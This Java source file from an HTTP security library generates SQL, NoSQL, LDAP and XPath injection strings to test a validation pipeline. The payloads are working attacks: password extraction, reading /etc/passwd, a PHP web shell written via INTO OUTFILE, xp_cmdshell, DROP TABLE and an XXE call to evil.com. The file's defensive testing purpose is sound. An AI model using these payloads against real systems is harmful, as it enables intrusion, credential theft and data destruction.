/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators.injection;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

/**
 * Generates SQL injection attack patterns for security testing.
 * 
 * <p>QI-6: Converted from fixedValues() to dynamic algorithmic generation.</p>
 * 
 * <p>
 * This generator creates comprehensive SQL injection attack vectors designed to test
 * the security validation pipeline's ability to detect and prevent SQL injection attacks.
 * SQL injection is one of the most dangerous web application security vulnerabilities,
 * allowing attackers to manipulate database queries and potentially access, modify,
 * or delete sensitive data.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li>Classic SQL Injection - Union-based attacks</li>
 *   <li>Boolean-based Blind SQL Injection</li>
 *   <li>Time-based Blind SQL Injection</li>
 *   <li>Error-based SQL Injection</li>
 *   <li>Second-order SQL Injection</li>
 *   <li>NoSQL Injection - MongoDB, CouchDB attacks</li>
 *   <li>LDAP Injection via SQL context</li>
 *   <li>SQL Comment Injection</li>
 *   <li>Stacked Queries Attack</li>
 *   <li>Database-specific Attacks (MySQL, PostgreSQL, MSSQL, Oracle)</li>
 *   <li>Function-based Injection</li>
 *   <li>XML/XPath Injection in SQL context</li>
 *   <li>SQL Truncation Attacks</li>
 *   <li>Polyglot SQL Injection</li>
 *   <li>SQL Injection via HTTP Headers</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>OWASP Top 10 - A03:2021 Injection</li>
 *   <li>CWE-89: Improper Neutralization of Special Elements in SQL Commands</li>
 *   <li>CWE-564: SQL Injection: Hibernate</li>
 *   <li>CWE-643: Improper Neutralization of Data within XPath Expressions</li>
 *   <li>NIST SP 800-53 - SI-10 Information Input Validation</li>
 *   <li>SANS Top 25 Most Dangerous Software Errors</li>
 *   <li>SQL Injection Prevention Cheat Sheet (OWASP)</li>
 *   <li>Database Security Guidelines (CIS)</li>
 * </ul>
 * 
 * Implements: Generator for Task T12 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
public class SqlInjectionAttackGenerator implements TypedGenerator<String> {

    // QI-6: Dynamic generation components
    private final TypedGenerator<Integer> basePatternTypeGen = Generators.integers(1, 5);
    private final TypedGenerator<Integer> attackTypeGen = Generators.integers(1, 15);

    @Override
    public String next() {
        String basePattern = generateBasePattern();
        int attackType = attackTypeGen.next();

        return switch (attackType) {
            case 1 -> createClassicUnionInjection(basePattern);
            case 2 -> createBooleanBlindInjection(basePattern);
            case 3 -> createTimeBlindInjection(basePattern);
            case 4 -> createErrorBasedInjection(basePattern);
            case 5 -> createSecondOrderInjection(basePattern);
            case 6 -> createNoSqlInjection(basePattern);
            case 7 -> createLdapInjection(basePattern);
            case 8 -> createCommentInjection(basePattern);
            case 9 -> createStackedQueries(basePattern);
            case 10 -> createDatabaseSpecificAttacks(basePattern);
            case 11 -> createFunctionInjection(basePattern);
            case 12 -> createXmlXpathInjection(basePattern);
            case 13 -> createTruncationAttacks(basePattern);
            case 14 -> createPolyglotSqlInjection(basePattern);
            case 15 -> createHeaderBasedInjection(basePattern);
            default -> createClassicUnionInjection(basePattern);
        };
    }

    private String generateBasePattern() {
        return switch (basePatternTypeGen.next()) {
            case 1 -> generateSearchEndpoints();
            case 2 -> generateUserEndpoints();
            case 3 -> generateAdminEndpoints();
            case 4 -> generateDataEndpoints();
            case 5 -> generateQueryEndpoints();
            default -> "/search";
        };
    }

    private String generateSearchEndpoints() {
        int type = Generators.integers(1, 3).next();
        return switch (type) {
            case 1 -> "/search";
            case 2 -> "/find";
            case 3 -> "/filter";
            default -> "/search";
        };
    }

    private String generateUserEndpoints() {
        int type = Generators.integers(1, 3).next();
        return switch (type) {
            case 1 -> "/user";
            case 2 -> "/profile";
            case 3 -> "/login";
            default -> "/user";
        };
    }

    private String generateAdminEndpoints() {
        int type = Generators.integers(1, 2).next();
        return switch (type) {
            case 1 -> "/admin";
            case 2 -> "/reports";
            default -> "/admin";
        };
    }

    private String generateDataEndpoints() {
        int type = Generators.integers(1, 4).next();
        return switch (type) {
            case 1 -> "/data";
            case 2 -> "/products";
            case 3 -> "/orders";
            case 4 -> "/api/users";
            default -> "/data";
        };
    }

    private String generateQueryEndpoints() {
        int type = Generators.integers(1, 3).next();
        return switch (type) {
            case 1 -> "/query";
            case 2 -> "/list";
            case 3 -> "/view";
            default -> "/query";
        };
    }

    /**
     * Create classic UNION-based SQL injection attacks.
     */
    private String createClassicUnionInjection(String pattern) {
        int unionType = Generators.integers(1, 14).next();

        String attack = switch (unionType) {
            case 1 -> "' UNION SELECT 1,2,3--";
            case 2 -> "' UNION SELECT username,password FROM users--";
            case 3 -> "' UNION ALL SELECT null,null,null--";
            case 4 -> "' UNION SELECT 1--";
            case 5 -> "' UNION SELECT 1,2--";
            case 6 -> "' UNION SELECT 1,2,3,4,5--";
            case 7 -> "' UNION SELECT database(),user(),version()--";
            case 8 -> "' UNION SELECT table_name FROM information_schema.tables--";
            case 9 -> "' UNION SELECT column_name FROM information_schema.columns--";
            case 10 -> "' UNION SELECT load_file('/etc/passwd')--";
            case 11 -> "' UNION SELECT 1 INTO OUTFILE '/tmp/result.txt'--";
            case 12 -> "' UNION SELECT 0x61646D696E--"; // 'admin' in hex
            case 13 -> "' UNION SELECT CONCAT(username,0x3a,password) FROM users--";
            case 14 -> "' UNION SELECT (SELECT password FROM users WHERE username='admin')--";
            default -> "' UNION SELECT 1,2,3--";
        };

        return pattern + "?id=" + attack;
    }

    /**
     * Create boolean-based blind SQL injection attacks.
     */
    private String createBooleanBlindInjection(String pattern) {
        int blindType = Generators.integers(1, 14).next();

        String attack = switch (blindType) {
            case 1 -> "' AND 1=1--";
            case 2 -> "' AND 1=2--";
            case 3 -> "' OR 1=1--";
            case 4 -> "' OR 1=2--";
            case 5 -> "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--";
            case 6 -> "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--";
            case 7 -> "' AND @@version LIKE '5%'--";
            case 8 -> "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--";
            case 9 -> "' AND (SELECT COUNT(*) FROM users)>0--";
            case 10 -> "' AND EXISTS(SELECT * FROM admin)--";
            case 11 -> "' AND (SELECT ASCII(MID((SELECT password FROM users WHERE id=1),1,1)))>96--";
            case 12 -> "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--";
            case 13 -> "' AND IF(1=1,SLEEP(0),SLEEP(5))--";
            case 14 -> "' AND (CASE WHEN 1=1 THEN 'true' ELSE 'false' END)='true'--";
            default -> "' AND 1=1--";
        };

        return pattern + "?search=" + attack;
    }

    /**
     * Create time-based blind SQL injection attacks.
     */
    private String createTimeBlindInjection(String pattern) {
        int timeType = Generators.integers(1, 14).next();

        String attack = switch (timeType) {
            case 1 -> "'; SELECT SLEEP(5)--";
            case 2 -> "' AND SLEEP(5)--";
            case 3 -> "' OR SLEEP(5)--";
            case 4 -> "' AND IF(1=1,SLEEP(5),0)--";
            case 5 -> "'; SELECT pg_sleep(5)--";
            case 6 -> "' AND (SELECT pg_sleep(5))IS NULL--";
            case 7 -> "'; WAITFOR DELAY '00:00:05'--";
            case 8 -> "' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--";
            case 9 -> "'; SELECT dbms_lock.sleep(5) FROM dual--";
            case 10 -> "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) IS NULL--";
            case 11 -> "' AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master))>100000--";
            case 12 -> "' AND IF(ASCII(SUBSTRING(password,1,1))>96,SLEEP(5),0) FROM users WHERE username='admin'--";
            case 13 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--";
            case 14 -> "' AND (SELECT * FROM (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C))--";
            default -> "'; SELECT SLEEP(5)--";
        };

        return pattern + "?filter=" + attack;
    }

    /**
     * Create error-based SQL injection attacks.
     */
    private String createErrorBasedInjection(String pattern) {
        int errorType = Generators.integers(1, 14).next();

        String attack = switch (errorType) {
            case 1 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--";
            case 2 -> "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))--";
            case 3 -> "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users),0x7e),1)--";
            case 4 -> "' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--";
            case 5 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RANDOM()*2))x FROM information_schema.tables GROUP BY x)a)--";
            case 6 -> "' AND CONVERT(INT,(SELECT password FROM users WHERE username='admin'))--";
            case 7 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM sysobjects GROUP BY x)a)--";
            case 8 -> "' AND UTLXML.getxml('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://evil.com/\"> %remote;]>') IS NULL--";
            case 9 -> "' AND 1/0--";
            case 10 -> "' AND 1/(SELECT 0)--";
            case 11 -> "' AND 'a'=0--";
            case 12 -> "' AND CONVERT(INT,@@version)--";
            case 13 -> "' AND (SELECT * FROM (SELECT password FROM users)x(password,password))--";
            case 14 -> "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT password FROM users WHERE username='admin')))--";
            default -> "' AND 1/0--";
        };

        return pattern + "?param=" + attack;
    }

    /**
     * Create second-order SQL injection attacks.
     */
    private String createSecondOrderInjection(String pattern) {
        int secondOrderType = Generators.integers(1, 11).next();

        String attack = switch (secondOrderType) {
            case 1 -> "admin' OR 1=1--";
            case 2 -> "user'; DROP TABLE users--";
            case 3 -> "test' UNION SELECT password FROM admin--";
            case 4 -> "test@evil.com'; UPDATE users SET password='hacked' WHERE username='admin'--";
            case 5 -> "Nice post!'; INSERT INTO admin (username,password) VALUES ('hacker','pass')--";
            case 6 -> "John Doe'; UPDATE profiles SET role='admin' WHERE user_id=1--";
            case 7 -> "search'; DELETE FROM logs WHERE user_id=1--";
            case 8 -> "document.pdf'; SELECT * FROM sensitive_data INTO OUTFILE '/tmp/leaked.txt'--";
            case 9 -> "session'; UPDATE sessions SET user_id=1 WHERE session_id='current'--";
            case 10 -> "step1'; CREATE TABLE temp AS SELECT * FROM users--";
            case 11 -> "trigger'; CREATE TRIGGER evil AFTER INSERT ON logs FOR EACH ROW BEGIN DELETE FROM users; END--";
            default -> "admin' OR 1=1--";
        };

        return pattern + "?username=" + attack;
    }

    /**
     * Create NoSQL injection attacks.
     */
    private String createNoSqlInjection(String pattern) {
        int noSqlType = Generators.integers(1, 15).next();

        String attack = switch (noSqlType) {
            case 1 -> "[$ne]=null";
            case 2 -> "[$gt]=";
            case 3 -> "[$regex]=.*";
            case 4 -> "[$where]=function(){return true}";
            case 5 -> "?key=\"\\u0000\"";
            case 6 -> "?startkey=\"\"&endkey=\"\\ufff0\"";
            case 7 -> "admin\",\"$ne\":\"xyz\"}//";
            case 8 -> "admin\",\"password\":{\"$ne\":\"xyz\"}}//";
            case 9 -> "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
            case 10 -> "{\"$or\":[{\"username\":\"admin\"},{\"role\":\"admin\"}]}";
            case 11 -> "function(doc){if(doc.type=='user')return true;}";
            case 12 -> "[{\"$match\":{\"$where\":\"function(){return true}\"}}]";
            case 13 -> "'; SET evil 'hacked'; GET evil--";
            case 14 -> "{\"query\":{\"match_all\":{}}}";
            case 15 -> "'; DROP TABLE users;--";
            default -> "[$ne]=null";
        };

        return pattern + "?query=" + attack;
    }

    /**
     * Create LDAP injection attacks via SQL context.
     */
    private String createLdapInjection(String pattern) {
        int ldapType = Generators.integers(1, 13).next();

        String attack = switch (ldapType) {
            case 1 -> "admin)(&)";
            case 2 -> "admin)(|(uid=*))";
            case 3 -> "admin)(|(objectClass=*))";
            case 4 -> "*)(uid=*))(|(uid=*";
            case 5 -> "admin*";
            case 6 -> "*))%00";
            case 7 -> "cn=admin,dc=example,dc=com)(&(uid=*))";
            case 8 -> "*))|(&(objectClass=user)(cn=*";
            case 9 -> "admin)(mail=*))%00";
            case 10 -> "'; SELECT * FROM ldap_users WHERE dn='cn=admin)(|(uid=*'--";
            case 11 -> "a*)(|(cn=a*";
            case 12 -> "admin)(%26)";
            case 13 -> "*))(|(userPassword=*";
            default -> "admin)(&)";
        };

        return pattern + "?ldap_query=" + attack;
    }

    /**
     * Create SQL comment injection attacks.
     */
    private String createCommentInjection(String pattern) {
        int commentType = Generators.integers(1, 15).next();

        String attack = switch (commentType) {
            case 1 -> "admin'--";
            case 2 -> "admin'#";
            case 3 -> "admin'/*";
            case 4 -> "admin'/**/OR/**/1=1/**/--";
            case 5 -> "admin'/*comment*/UNION/*comment*/SELECT/*comment*/1--";
            case 6 -> "admin'/*/*/OR/*/*/1=1/*/*/--";
            case 7 -> "admin';/*payload*/SELECT/*payload*/password/*payload*/FROM/*payload*/users/*payload*/--";
            case 8 -> "admin'%2D%2D";
            case 9 -> "admin'%23";
            case 10 -> "admin'%2F%2A";
            case 11 -> "admin'--+";  // MySQL
            case 12 -> "admin';--";  // MSSQL
            case 13 -> "admin'#";    // MySQL/PostgreSQL
            case 14 -> "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL/**/--";
            case 15 -> "admin'--\n";
            default -> "admin'--";
        };

        return pattern + "?user=" + attack;
    }

    /**
     * Create stacked queries attacks.
     */
    private String createStackedQueries(String pattern) {
        int stackedType = Generators.integers(1, 13).next();

        String attack = switch (stackedType) {
            case 1 -> "'; SELECT 1--";
            case 2 -> "'; DROP TABLE users--";
            case 3 -> "'; INSERT INTO users VALUES ('hacker','pass')--";
            case 4 -> "'; UPDATE users SET password='hacked' WHERE username='admin'; SELECT 1--";
            case 5 -> "'; CREATE USER hacker IDENTIFIED BY 'pass'--";
            case 6 -> "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--";
            case 7 -> "'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--";
            case 8 -> "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)--";
            case 9 -> "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--";
            case 10 -> "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW INSERT INTO admin VALUES (NEW.username, NEW.password)--";
            case 11 -> "'; CREATE PROCEDURE GetData() BEGIN SELECT * FROM sensitive_table; END--";
            case 12 -> "'; BEGIN; UPDATE users SET role='admin' WHERE username='hacker'; COMMIT--";
            case 13 -> "'; IF @@version LIKE '%mysql%' SELECT 'MySQL' ELSE SELECT 'Other'--";
            default -> "'; SELECT 1--";
        };

        return pattern + "?action=" + attack;
    }

    /**
     * Create database-specific attacks.
     */
    private String createDatabaseSpecificAttacks(String pattern) {
        int dbType = Generators.integers(1, 17).next();

        String attack = switch (dbType) {
            case 1 -> "' AND @@version--";
            case 2 -> "' UNION SELECT load_file('/etc/passwd')--";
            case 3 -> "' INTO OUTFILE '/var/www/backdoor.php'--";
            case 4 -> "' AND version()='PostgreSQL'--";
            case 5 -> "'; COPY users FROM '/tmp/evil.csv'--";
            case 6 -> "' UNION SELECT pg_read_file('/etc/passwd')--";
            case 7 -> "' AND @@version LIKE '%Microsoft%'--";
            case 8 -> "'; EXEC master..xp_cmdshell 'dir'--";
            case 9 -> "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server';'uid';'pwd','SELECT * FROM users')--";
            case 10 -> "' AND banner LIKE '%Oracle%' FROM v$version--";
            case 11 -> "' UNION SELECT utl_file.get_line('DIRECTORY','filename') FROM dual--";
            case 12 -> "' AND sqlite_version()>='3'--";
            case 13 -> "' UNION SELECT tbl_name FROM sqlite_master--";
            case 14 -> "' AND 1=IIF(1=1,1,0)--";
            case 15 -> "' UNION SELECT * FROM MSysObjects--";
            case 16 -> "' AND USER='DB2ADMIN'--";
            case 17 -> "' UNION SELECT * FROM sysibm.systables--";
            default -> "' AND @@version--";
        };

        return pattern + "?db_test=" + attack;
    }

    /**
     * Create function-based SQL injection attacks.
     */
    private String createFunctionInjection(String pattern) {
        int functionType = Generators.integers(1, 14).next();

        String attack = switch (functionType) {
            case 1 -> "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--";
            case 2 -> "' AND LENGTH((SELECT password FROM users WHERE username='admin'))>5--";
            case 3 -> "' AND LOCATE('admin',(SELECT username FROM users))>0--";
            case 4 -> "' AND FLOOR(RAND(0)*2)=1--";
            case 5 -> "' AND CEILING((SELECT COUNT(*) FROM users)/2)>1--";
            case 6 -> "' AND YEAR(NOW())=2023--";
            case 7 -> "' AND DATEDIFF(NOW(),(SELECT created_date FROM users WHERE username='admin'))>365--";
            case 8 -> "' AND IF((SELECT COUNT(*) FROM users)>0,'true','false')='true'--";
            case 9 -> "' AND CASE WHEN 1=1 THEN 'true' ELSE 'false' END='true'--";
            case 10 -> "' AND COUNT(*)>0 FROM users--";
            case 11 -> "' AND MAX(user_id)>100 FROM users--";
            case 12 -> "' AND USER()='root'--";
            case 13 -> "' AND DATABASE()='production'--";
            case 14 -> "' AND CAST((SELECT password FROM users WHERE username='admin') AS CHAR)='secret'--";
            default -> "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--";
        };

        return pattern + "?func_test=" + attack;
    }

    /**
     * Create XML/XPath injection in SQL context.
     */
    private String createXmlXpathInjection(String pattern) {
        int xmlType = Generators.integers(1, 8).next();

        String attack = switch (xmlType) {
            case 1 -> "' OR 1=1 or ''='";
            case 2 -> "'] | //user/* | //password/* | //*['";
            case 3 -> "admin' and count(//user[position()=1])=1 and '1'='1";
            case 4 -> "'; SELECT EXTRACTVALUE('<xml><!ENTITY xxe SYSTEM \"file:///etc/passwd\">xxe;</xml>','//xxe')--";
            case 5 -> "admin'] | //user[password='secret' or '1'='1";
            case 6 -> "'] | //user[position()=1 and substring(password,1,1)='a'] | //*['";
            case 7 -> "'; SELECT '<![CDATA[' + (SELECT password FROM users WHERE username='admin') + ']]>'--";
            case 8 -> "'] | //user[contains(password,'error')] | //*['";
            default -> "' OR 1=1 or ''='";
        };

        return pattern + "?xml_query=" + attack;
    }

    /**
     * Create SQL truncation attacks.
     */
    private String createTruncationAttacks(String pattern) {
        int truncationType = Generators.integers(1, 5).next();

        String attack = switch (truncationType) {
            case 1 -> "admin" + Generators.letterStrings(20, 50).next() + "' OR 1=1--";
            case 2 -> "admin\u0000' OR 1=1--";
            case 3 -> "adminÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ' OR 1=1--";
            case 4 -> "admin" + Generators.strings(" ", 50, 200).next() + "' OR 1=1--";
            case 5 -> "admin%00%00%00%00%00' OR 1=1--";
            default -> "admin" + Generators.letterStrings(20, 50).next() + "' OR 1=1--";
        };

        return pattern + "?truncate=" + attack;
    }

    /**
     * Create polyglot SQL injection attacks.
     */
    private String createPolyglotSqlInjection(String pattern) {
        int polyglotType = Generators.integers(1, 5).next();

        String attack = switch (polyglotType) {
            case 1 -> "'; alert('SQL+XSS'); SELECT 1--";
            case 2 -> "' OR 1=1 AND '1'='1'; db.users.find()--";
            case 3 -> "admin' OR 1=1--)(|(uid=*))";
            case 4 -> "' UNION SELECT '<xml><user>admin</user></xml>' WHERE 1=1--";
            case 5 -> "' OR 1=1# AND '1'='1'; DROP TABLE users; db.collection.drop(); --";
            default -> "'; alert('SQL+XSS'); SELECT 1--";
        };

        return pattern + "?polyglot=" + attack;
    }

    /**
     * Create HTTP header-based SQL injection.
     */
    private String createHeaderBasedInjection(String pattern) {
        int headerType = Generators.integers(1, 5).next();

        String attack = switch (headerType) {
            case 1 -> "Mozilla/5.0' OR 1=1--";
            case 2 -> "127.0.0.1' UNION SELECT password FROM users--";
            case 3 -> "sessionid=abc123' OR 1=1--";
            case 4 -> "http://evil.com/' OR 1=1--";
            case 5 -> "header_value' AND 1=1--";
            default -> "Mozilla/5.0' OR 1=1--";
        };

        return pattern + "?header=" + attack;
    }

    /**
     * Check if a string contains SQL injection patterns.
     */
    public boolean containsSqlInjectionPatterns(String input) {
        if (input == null) {
            return false;
        }

        String lowercaseInput = input.toLowerCase();

        // Check for SQL keywords
        String[] sqlKeywords = {"union", "select", "insert", "update", "delete", "drop", "create", "alter"};
        for (String keyword : sqlKeywords) {
            if (lowercaseInput.contains(keyword)) {
                return true;
            }
        }

        // Check for SQL operators
        if (lowercaseInput.contains(" or ") || lowercaseInput.contains(" and ") ||
                lowercaseInput.contains("1=1") || lowercaseInput.contains("1=2")) {
            return true;
        }

        // Check for SQL comments
        if (lowercaseInput.contains("--") || lowercaseInput.contains("#") ||
                lowercaseInput.contains("/*")) {
            return true;
        }

        // Check for common SQL injection patterns
        if (lowercaseInput.contains("' or") || lowercaseInput.contains("\" or") ||
                lowercaseInput.contains("' and") || lowercaseInput.contains("\" and")) {
            return true;
        }

        return false;
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }
}